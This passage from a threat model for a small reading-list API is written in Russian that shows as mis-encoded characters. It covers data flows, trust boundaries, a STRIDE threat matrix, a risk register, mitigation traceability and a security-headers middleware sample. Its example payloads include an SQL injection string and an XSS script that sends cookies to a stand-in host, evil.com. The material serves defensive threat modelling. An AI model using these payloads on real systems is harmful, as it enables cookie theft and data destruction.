â”‚  ğŸ‘¤      â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º
â”‚  Client  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ Rate Limiter  â”‚ â”€â”€ Check: < 100 req/min?
            â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ Query Parser  â”‚ â”€â”€ Validate: status âˆˆ {to_read, reading, completed}
            â”‚  (Pydantic)   â”‚ â”€â”€ Validate: author: str, max 100 chars
            â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ CRUD Handler  â”‚ â”€â”€ Filter in-memory list
            â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ Response      â”‚ â”€â”€ JSON array of Entry objects
            â”‚ Serializer    â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.4 Ğ¢Ğ°Ğ±Ğ»Ğ¸Ñ†Ğ° Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ² Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…

| ID | ĞŸĞ¾Ñ‚Ğ¾Ğº | Ğ˜ÑÑ‚Ğ¾Ñ‡Ğ½Ğ¸Ğº | ĞĞ°Ğ·Ğ½Ğ°Ñ‡ĞµĞ½Ğ¸Ğµ | ĞŸÑ€Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ» | Ğ”Ğ°Ğ½Ğ½Ñ‹Ğµ | Trust Boundary |
|----|-------|----------|------------|----------|--------|----------------|
| **F1** | Client Request | User | Load Balancer | HTTPS/TLS 1.3 | JSON body | External â†’ Edge |
| **F2** | Forward Request | LB | API Server | HTTP internal | JSON + Headers | Edge â†’ Core |
| **F3** | Rate Check | API | Rate Limiter | Internal | IP, timestamp | Core internal |
| **F4** | Validation | Input | Pydantic | Internal | Raw â†’ Typed | Core internal |
| **F5** | Database Query | Handler | Database | SQL/ORM | Query params | Core â†’ Data |
| **F6** | Database Response | Database | Handler | Internal | Entry records | Data â†’ Core |
| **F7** | Audit Log | Handler | Logger | Internal | Action metadata | Core internal |

### 3.5 Ğ“Ñ€Ğ°Ğ½Ğ¸Ñ†Ñ‹ Ğ´Ğ¾Ğ²ĞµÑ€Ğ¸Ñ

| Ğ“Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ° | Ğ£Ñ€Ğ¾Ğ²ĞµĞ½ÑŒ | ĞĞ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ | ĞšĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸ |
|---------|---------|----------|----------|
| ğŸ”´ **External** | 0 (Untrusted) | Ğ’Ğ½ĞµÑˆĞ½Ğ¸Ğµ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ğ¸, Ğ°Ñ‚Ğ°ĞºÑƒÑÑ‰Ğ¸Ğµ | TLS, Rate Limiting, WAF |
| ğŸŸ¡ **Edge** | 1 (Semi-trusted) | DMZ, reverse proxy | IP filtering, Header sanitization |
| ğŸŸ¢ **Core** | 2 (Trusted) | Ğ‘Ğ¸Ğ·Ğ½ĞµÑ-Ğ»Ğ¾Ğ³Ğ¸ĞºĞ° | Input validation, AuthZ |
| ğŸ”µ **Data** | 3 (Highly-trusted) | Ğ¥Ñ€Ğ°Ğ½Ğ¸Ğ»Ğ¸Ñ‰Ğµ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… | Encryption, Network isolation |

---

## 4. STRIDE â€” ĞĞ½Ğ°Ğ»Ğ¸Ğ· ÑƒĞ³Ñ€Ğ¾Ğ·

### 4.1 ĞœĞ°Ñ‚Ñ€Ğ¸Ñ†Ğ° STRIDE (15 ÑƒĞ³Ñ€Ğ¾Ğ·)

| ID | ĞŸĞ¾Ñ‚Ğ¾Ğº/Ğ­Ğ»ĞµĞ¼ĞµĞ½Ñ‚ | Cat. | Ğ£Ğ³Ñ€Ğ¾Ğ·Ğ° | ĞĞ¿Ğ¸ÑĞ°Ğ½Ğ¸Ğµ | ĞšĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»ÑŒ | NFR |
|----|---------------|------|--------|----------|----------|-----|
| **T01** | F1: Client Request | **S** | ĞŸĞ¾Ğ´Ğ¼ĞµĞ½Ğ° ĞºĞ»Ğ¸ĞµĞ½Ñ‚Ğ° | Ğ—Ğ°Ğ¿Ñ€Ğ¾ÑÑ‹ Ğ¾Ñ‚ Ğ¸Ğ¼ĞµĞ½Ğ¸ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ³Ğ¾ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ | API Key / JWT | NFR-003 |
| **T02** | F1: Client Request | **T** | MITM-Ğ°Ñ‚Ğ°ĞºĞ° | ĞŸĞµÑ€ĞµÑ…Ğ²Ğ°Ñ‚ Ğ¸ Ğ¼Ğ¾Ğ´Ğ¸Ñ„Ğ¸ĞºĞ°Ñ†Ğ¸Ñ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… | TLS 1.3, HSTS | NFR-002 |
| **T03** | F1: Client Request | **D** | DDoS-Ğ°Ñ‚Ğ°ĞºĞ° | ĞœĞ°ÑÑĞ¾Ğ²Ğ°Ñ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ° Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ¾Ğ² | Rate Limiting 100/min | NFR-004 |
| **T04** | F2: Forward Request | **I** | Ğ£Ñ‚ĞµÑ‡ĞºĞ° Ğ·Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²ĞºĞ¾Ğ² | Ğ’Ğ½ÑƒÑ‚Ñ€ĞµĞ½Ğ½Ğ¸Ğµ Ğ·Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²ĞºĞ¸ â†’ ĞºĞ»Ğ¸ĞµĞ½Ñ‚ | Header sanitization | NFR-007 |
| **T05** | F3: Database Query | **T** | SQL Injection | `'; DROP TABLE entries; --` | Pydantic + ORM | NFR-003 |
| **T06** | F3: Database Query | **I** | Ğ˜Ğ·Ğ²Ğ»ĞµÑ‡ĞµĞ½Ğ¸Ğµ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… | Ğ”Ğ¾ÑÑ‚ÑƒĞ¿ Ğº Ñ‡ÑƒĞ¶Ğ¸Ğ¼ Ğ·Ğ°Ğ¿Ğ¸ÑÑĞ¼ | Row-level security | NFR-003 |
| **T07** | F4: DB Response | **I** | Ğ£Ñ‚ĞµÑ‡ĞºĞ° stack trace | Stack trace Ğ² Ğ¾Ñ‚Ğ²ĞµÑ‚Ğµ | Custom error handler | NFR-007 |
| **T08** | F5: API Response | **I** | Ğ˜Ğ·Ğ±Ñ‹Ñ‚Ğ¾Ñ‡Ğ½Ñ‹Ğµ Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ | Internal fields Ğ² Ğ¾Ñ‚Ğ²ĞµÑ‚Ğµ | Response filtering | NFR-006 |
| **T09** | Input Validator | **T** | XSS payload | `<script>alert('xss')</script>` | CSP, sanitization | NFR-003 |
| **T10** | Input Validator | **T** | Oversized payload | 100MB body â†’ OOM | Max body 64KB | NFR-008 |
| **T11** | CRUD Handler | **R** | ĞÑ‚ÑÑƒÑ‚ÑÑ‚Ğ²Ğ¸Ğµ Ğ°ÑƒĞ´Ğ¸Ñ‚Ğ° | "Ğ¯ ÑÑ‚Ğ¾Ğ³Ğ¾ Ğ½Ğµ Ğ´ĞµĞ»Ğ°Ğ»" | Audit logging | NFR-007 |
| **T12** | CRUD Handler | **E** | Mass assignment | Ğ˜Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ¸Ğµ `id`, `created_at` | Pydantic explicit | NFR-003 |
| **T13** | Rate Limiter | **D** | Bypass rate limit | IP rotation | IP + fingerprint | NFR-004 |
| **T14** | Audit Logger | **R** | Log injection | Ğ¤Ğ°Ğ»ÑŒÑĞ¸Ñ„Ğ¸ĞºĞ°Ñ†Ğ¸Ñ Ğ»Ğ¾Ğ³Ğ¾Ğ² | Log sanitization | NFR-007 |
| **T15** | Database | **I** | Backup exposure | Ğ£Ñ‚ĞµÑ‡ĞºĞ° backup Ñ„Ğ°Ğ¹Ğ»Ğ¾Ğ² | Encryption at rest | NFR-005 |

### 4.2 ĞœĞ°Ñ‚Ñ€Ğ¸Ñ†Ğ° STRIDE Ğ¿Ğ¾ ÑĞ»ĞµĞ¼ĞµĞ½Ñ‚Ğ°Ğ¼

| Ğ­Ğ»ĞµĞ¼ĞµĞ½Ñ‚/ĞŸĞ¾Ñ‚Ğ¾Ğº | S | T | R | I | D | E |
|---------------|:-:|:-:|:-:|:-:|:-:|:-:|
| F1: Client Request | T01 | T02 | â€” | â€” | T03 | â€” |
| F2: Forward Request | â€” | â€” | â€” | T04 | â€” | â€” |
| F3: Database Query | â€” | T05 | â€” | T06 | â€” | â€” |
| F4: DB Response | â€” | â€” | â€” | T07 | â€” | â€” |
| F5: API Response | â€” | â€” | â€” | T08 | â€” | â€” |
| Input Validator | â€” | T09, T10 | â€” | â€” | â€” | â€” |
| CRUD Handler | â€” | â€” | T11 | â€” | â€” | T12 |
| Rate Limiter | â€” | â€” | â€” | â€” | T13 | â€” |
| Audit Logger | â€” | â€” | T14 | â€” | â€” | â€” |
| Database | â€” | â€” | â€” | T15 | â€” | â€” |

### 4.3 Ğ”ĞµÑ‚Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ°Ğ½Ğ°Ğ»Ğ¸Ğ· ĞºĞ»ÑÑ‡ĞµĞ²Ñ‹Ñ… ÑƒĞ³Ñ€Ğ¾Ğ·

#### T03: DoS â€” DDoS-Ğ°Ñ‚Ğ°ĞºĞ° (Critical)

**ĞŸĞ¾Ñ‚Ğ¾Ğº:** F1 (Client â†’ Load Balancer)

**Attack Tree:**
```
DDoS Attack
â”œâ”€â”€ Volume-based
â”‚   â”œâ”€â”€ HTTP Flood â†’ Rate Limiting blocks
â”‚   â””â”€â”€ Amplification â†’ WAF/CDN mitigates
â”œâ”€â”€ Protocol-based
â”‚   â”œâ”€â”€ SYN Flood â†’ OS-level protection
â”‚   â””â”€â”€ Slowloris â†’ Timeout settings
â””â”€â”€ Application-layer
    â”œâ”€â”€ Resource exhaustion â†’ Body size limit
    â””â”€â”€ Regex DoS â†’ No user regex
```

**Ğ¡Ñ†ĞµĞ½Ğ°Ñ€Ğ¸Ğ¹ Ğ°Ñ‚Ğ°ĞºĞ¸:**
1. ĞÑ‚Ğ°ĞºÑƒÑÑ‰Ğ¸Ğ¹ Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞµÑ‚ 10,000 req/sec
2. Ğ¡ĞµÑ€Ğ²ĞµÑ€ Ğ¸ÑÑ‡ĞµÑ€Ğ¿Ñ‹Ğ²Ğ°ĞµÑ‚ Ñ€ĞµÑÑƒÑ€ÑÑ‹
3. Ğ›ĞµĞ³Ğ¸Ñ‚Ğ¸Ğ¼Ğ½Ñ‹Ğµ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ğ¸ Ğ¿Ğ¾Ğ»ÑƒÑ‡Ğ°ÑÑ‚ 503

**ĞšĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸:**
- [x] Rate Limiting: 100 req/min Ğ½Ğ° IP
- [x] Request size limit: 64KB
- [ ] WAF (production)
- [ ] CloudFlare/AWS Shield (production)

---

#### T05: Tampering â€” SQL Injection (Critical)

**ĞŸĞ¾Ñ‚Ğ¾Ğº:** F3 (API â†’ Database)

**Payload examples:**
```
POST /entries
{
  "title": "'; DROP TABLE entries; --",
  "author": "Robert'); DELETE FROM users;--"
}
```

**Defense in Depth:**
```
Layer 1: Pydantic validation
         â”œâ”€â”€ max_length=200 â†’ truncates payload
         â””â”€â”€ type checking â†’ rejects non-strings

Layer 2: ORM (SQLAlchemy in prod)
         â””â”€â”€ Parameterized queries â†’ escapes special chars

Layer 3: In-memory store (dev)
         â””â”€â”€ No SQL parsing at all
```

**ĞšĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸:**
- [x] Pydantic Field(max_length=200)
- [x] ORM with parameterized queries
- [x] Test: `test_create_entry_validation_error`

---

#### T09: Tampering â€” XSS payload (High)

**Payload examples:**
```
POST /entries
{
  "title": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
  "author": "<img src=x onerror=alert('XSS')>"
}
```

**ĞšĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸:**
- [x] CSP header: `default-src 'self'`
- [x] X-Content-Type-Options: nosniff
- [x] X-XSS-Protection: 1; mode=block
- [ ] Output encoding (frontend responsibility)

---

## 5. ĞœĞµÑ€Ñ‹ Ğ¿Ñ€Ğ¾Ñ‚Ğ¸Ğ²Ğ¾Ğ´ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ñ Ñ Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¾Ğ¹

### 5.1 ĞœĞ°Ñ‚Ñ€Ğ¸Ñ†Ğ° Ñ‚Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ¸: Ğ£Ğ³Ñ€Ğ¾Ğ·Ğ° â†’ ĞœĞµÑ€Ğ° â†’ NFR â†’ ĞšĞ¾Ğ´

| Ğ£Ğ³Ñ€Ğ¾Ğ·Ğ° | ĞœĞµÑ€Ğ° | NFR | Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ | Ğ¤Ğ°Ğ¹Ğ» |
|--------|------|-----|------------|------|
| T01 (Spoofing) | JWT Ñ‚Ğ¾ĞºĞµĞ½Ñ‹ | NFR-003 | ĞŸĞ»Ğ°Ğ½Ğ¸Ñ€ÑƒĞµÑ‚ÑÑ | â€” |
| T02 (MITM) | TLS 1.3 + HSTS | NFR-002 | Infrastructure | nginx.conf |
| **T03 (DDoS)** | Rate Limiting | NFR-004 | âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾ | `app/main.py:95` |
| T04 (Headers) | Header sanitization | NFR-007 | âœ… Middleware | `app/main.py:35-56` |
| **T05 (SQLi)** | Pydantic + ORM | NFR-003 | âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾ | `app/models.py` |
| T06 (Data leak) | Row-level security | NFR-003 | ĞŸĞ»Ğ°Ğ½Ğ¸Ñ€ÑƒĞµÑ‚ÑÑ | â€” |
| **T07 (Stack trace)** | Custom error handler | NFR-007 | âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾ | `app/main.py:135-167` |
| T08 (Excess data) | Response model | NFR-006 | âœ… Pydantic | `app/models.py:38-48` |
| **T09 (XSS)** | CSP headers | NFR-003 | âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾ | `app/main.py:47` |
| **T10 (Large body)** | Size limit 64KB | NFR-008 | âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾ | `app/main.py:64-90` |
| **T11 (Repudiation)** | Audit logging | NFR-007 | âœ… Ğ ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾ | `app/main.py:223-278` |
| **T12 (Mass assign)** | Explicit fields | NFR-003 | âœ… Pydantic | `app/models.py:16-26` |
| T13 (Rate bypass) | Fingerprint | NFR-004 | ĞŸĞ»Ğ°Ğ½Ğ¸Ñ€ÑƒĞµÑ‚ÑÑ | â€” |
| T14 (Log inject) | Log sanitization | NFR-007 | âœ… Structured | `app/main.py:21-26` |
| T15 (Backup) | Encryption at rest | NFR-005 | Infrastructure | â€” |

### 5.2 Ğ¢Ñ€Ğ°ÑÑĞ¸Ñ€Ğ¾Ğ²ĞºĞ°: NFR â†’ User Story â†’ Ğ¢ĞµÑÑ‚

| NFR | User Story | Ğ¢ĞµÑÑ‚ | Ğ¡Ñ‚Ğ°Ñ‚ÑƒÑ |
|-----|------------|------|--------|
| NFR-001 | US-006 (Ğ‘Ñ‹ÑÑ‚Ñ€Ñ‹Ğ¹ Ğ¾Ñ‚ĞºĞ»Ğ¸Ğº) | `test_performance.py` | ğŸ“‹ ĞŸĞ»Ğ°Ğ½ |
| NFR-002 | US-007 (ĞĞ°Ğ´Ñ‘Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ) | `test_health.py` | âœ… Ğ•ÑÑ‚ÑŒ |
| NFR-003 | US-008 (Ğ‘ĞµĞ·Ğ¾Ğ¿Ğ°ÑĞ½Ğ¾ÑÑ‚ÑŒ) | `test_reading_list.py` | âœ… Ğ•ÑÑ‚ÑŒ |
| NFR-004 | US-007, US-008 | `test_security_controls.py` | âœ… Ğ•ÑÑ‚ÑŒ |
| NFR-005 | US-008 | CI: pip-audit | âœ… CI |
| NFR-007 | US-008 | `test_security_controls.py` | âœ… Ğ•ÑÑ‚ÑŒ |
| NFR-008 | US-008 | `test_security_controls.py` | âœ… Ğ•ÑÑ‚ÑŒ |
| NFR-010 | All | CI: pytest-cov | âœ… CI |

### 5.3 Security Headers (T04, T09)

```python
# Ğ”Ğ¾ĞºĞ°Ğ·Ğ°Ñ‚ĞµĞ»ÑŒÑÑ‚Ğ²Ğ¾ Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ğ¸: app/main.py
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        
        # T09: Prevent XSS attacks
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Content-Security-Policy"] = "default-src 'self'"
        
        # T04: Prevent information leakage
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
        
        return response
```

---

## 6. Ğ ĞµĞµÑÑ‚Ñ€ Ñ€Ğ¸ÑĞºĞ¾Ğ² Ğ¸ Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ

### 6.1 ĞœĞµÑ‚Ğ¾Ğ´Ğ¾Ğ»Ğ¾Ğ³Ğ¸Ñ Ğ¾Ñ†ĞµĞ½ĞºĞ¸

**Ğ¨ĞºĞ°Ğ»Ğ°:**
- **L (Likelihood):** 1-5 (1 = Ñ€ĞµĞ´ĞºĞ¾, 5 = Ğ¿Ğ¾Ñ‡Ñ‚Ğ¸ Ğ½Ğ°Ğ²ĞµÑ€Ğ½ÑĞºĞ°)
- **I (Impact):** 1-5 (1 = Ğ¼Ğ¸Ğ½Ğ¸Ğ¼Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹, 5 = ĞºÑ€Ğ¸Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸Ğ¹)
- **Risk Score:** L Ã— I (1-25)

**Ğ£Ñ€Ğ¾Ğ²Ğ½Ğ¸ Ñ€Ğ¸ÑĞºĞ°:**
| Score | Ğ£Ñ€Ğ¾Ğ²ĞµĞ½ÑŒ | Ğ”ĞµĞ¹ÑÑ‚Ğ²Ğ¸Ğµ |
|-------|---------|----------|
| 20-25 | âš« Critical | ĞĞµĞ¼ĞµĞ´Ğ»ĞµĞ½Ğ½Ğ¾ ÑƒÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ‚ÑŒ |
| 13-19 | ğŸ”´ High | Ğ¡Ñ€Ğ¾Ñ‡Ğ½Ğ¾ ÑĞ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ |
| 7-12 | ğŸŸ¡ Medium | ĞŸĞ»Ğ°Ğ½Ğ¸Ñ€Ğ¾Ğ²Ğ°Ñ‚ÑŒ Ğ¼Ğ¸Ñ‚Ğ¸Ğ³Ğ°Ñ†Ğ¸Ñ |
| 1-6 | ğŸŸ¢ Low | ĞŸÑ€Ğ¸Ğ½ÑÑ‚ÑŒ Ğ¸Ğ»Ğ¸ Ğ¾Ñ‚Ğ»Ğ¾Ğ¶Ğ¸Ñ‚ÑŒ |

### 6.2 Ğ ĞµĞµÑÑ‚Ñ€ Ñ€Ğ¸ÑĞºĞ¾Ğ² (12 Ñ€Ğ¸ÑĞºĞ¾Ğ²)

| ID | Ğ Ğ¸ÑĞº | STRIDE | L | I | Score | Ğ£Ñ€Ğ¾Ğ²ĞµĞ½ÑŒ | Ğ¡Ñ‚Ñ€Ğ°Ñ‚ĞµĞ³Ğ¸Ñ | Ğ¡Ñ‚Ğ°Ñ‚ÑƒÑ |
|----|------|--------|:-:|:-:|:-----:|---------|-----------|--------|
| **R01** | DDoS-Ğ°Ñ‚Ğ°ĞºĞ° | T03 | 4 | 5 | 20 | âš« Critical | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R02** | SQL Injection | T05 | 2 | 5 | 10 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R03** | XSS-Ğ°Ñ‚Ğ°ĞºĞ° | T09 | 3 | 4 | 12 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R04** | ĞÑ‚ÑÑƒÑ‚ÑÑ‚Ğ²Ğ¸Ğµ Ğ°ÑƒĞ´Ğ¸Ñ‚Ğ° | T11 | 3 | 4 | 12 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R05** | MITM-Ğ°Ñ‚Ğ°ĞºĞ° | T02 | 2 | 5 | 10 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R06** | Stack trace leak | T07 | 4 | 2 | 8 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R07** | Rate limit bypass | T13 | 3 | 3 | 9 | ğŸŸ¡ Medium | ĞŸÑ€Ğ¸Ğ½ÑÑ‚ÑŒ | ğŸ“‹ ĞŸĞ»Ğ°Ğ½ |
| **R08** | Mass assignment | T12 | 2 | 4 | 8 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R09** | Oversized payload | T10 | 3 | 3 | 9 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R10** | Vulnerable deps | T15 | 3 | 4 | 12 | ğŸŸ¡ Medium | Ğ¡Ğ½Ğ¸Ğ·Ğ¸Ñ‚ÑŒ | âœ… Ğ—Ğ°ĞºÑ€Ñ‹Ñ‚ |
| **R11** | Spoofing | T01 | 2 | 4 | 8 | ğŸŸ¡ Medium | ĞŸÑ€Ğ¸Ğ½ÑÑ‚ÑŒ | ğŸ“‹ ĞŸĞ»Ğ°Ğ½ |
| **R12** | Log injection | T14 | 2 | 3 | 6 | ğŸŸ¢ Low | ĞŸÑ€Ğ¸Ğ½ÑÑ‚ÑŒ | â¸ï¸ ĞÑ‚Ğ»Ğ¾Ğ¶ĞµĞ½ |

### 6.3 Heat Map (Ğ¢ĞµĞ¿Ğ»Ğ¾Ğ²Ğ°Ñ ĞºĞ°Ñ€Ñ‚Ğ°)

```
              Impact â†’
           1     2     3     4     5
         â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”
       5 â”‚     â”‚     â”‚     â”‚     â”‚ R01 â”‚ â† Critical (Ğ·Ğ°ĞºÑ€Ñ‹Ñ‚)
         â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
       4 â”‚     â”‚ R06 â”‚ R07 â”‚ R03 â”‚     â”‚
    L  â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
    i  3 â”‚     â”‚     â”‚ R09 â”‚ R04 â”‚ R10 â”‚
    k  â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
    e  2 â”‚     â”‚     â”‚ R12 â”‚ R08 â”‚ R02 â”‚
       â”‚     â”‚     â”‚     â”‚ R11 â”‚ R05 â”‚
         â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
       1 â”‚     â”‚     â”‚     â”‚     â”‚     â”‚
         â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜
               Low   Med   High  Crit
```

### 6.4 ĞŸĞ»Ğ°Ğ½ Ğ¼Ğ¸Ñ‚Ğ¸Ğ³Ğ°Ñ†Ğ¸Ğ¸ Ğ¿Ğ¾ ÑĞ¿Ñ€Ğ¸Ğ½Ñ‚Ğ°Ğ¼

#### Sprint 1 (âœ… Ğ—Ğ°Ğ²ĞµÑ€ÑˆÑ‘Ğ½)
- [x] R01: DDoS â†’ Rate Limiting 100/min
- [x] R02: SQLi â†’ Pydantic + ORM
- [x] R05: MITM â†’ TLS configuration
- [x] R06: Stack trace â†’ Custom error handler
- [x] R08: Mass assignment â†’ Pydantic explicit fields
- [x] R10: Dependencies â†’ pip-audit Ğ² CI

#### Sprint 2 (âœ… Ğ—Ğ°Ğ²ĞµÑ€ÑˆÑ‘Ğ½)
- [x] R03: XSS â†’ CSP headers + X-XSS-Protection
- [x] R04: Audit â†’ Structured logging
- [x] R09: Oversized â†’ Body size limit 64KB

#### Sprint 3+ (Backlog)
- [ ] R07: Rate limit bypass â†’ WAF rules, fingerprinting
- [ ] R11: Spoofing â†’ JWT authentication

#### Accepted Risks
- R12: Log injection â€” Ğ½Ğ¸Ğ·ĞºĞ¸Ğ¹ Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚ (Score: 6)

---

## 7. Abuse Cases / Misuse Cases

### 7.1 Abuse Case 1: DDoS Ñ‡ĞµÑ€ĞµĞ· ÑĞ¾Ğ·Ğ´Ğ°Ğ½Ğ¸Ğµ Ğ·Ğ°Ğ¿Ğ¸ÑĞµĞ¹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ABUSE CASE: DDoS via Entry Creation                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Actor: Malicious User                                           â”‚
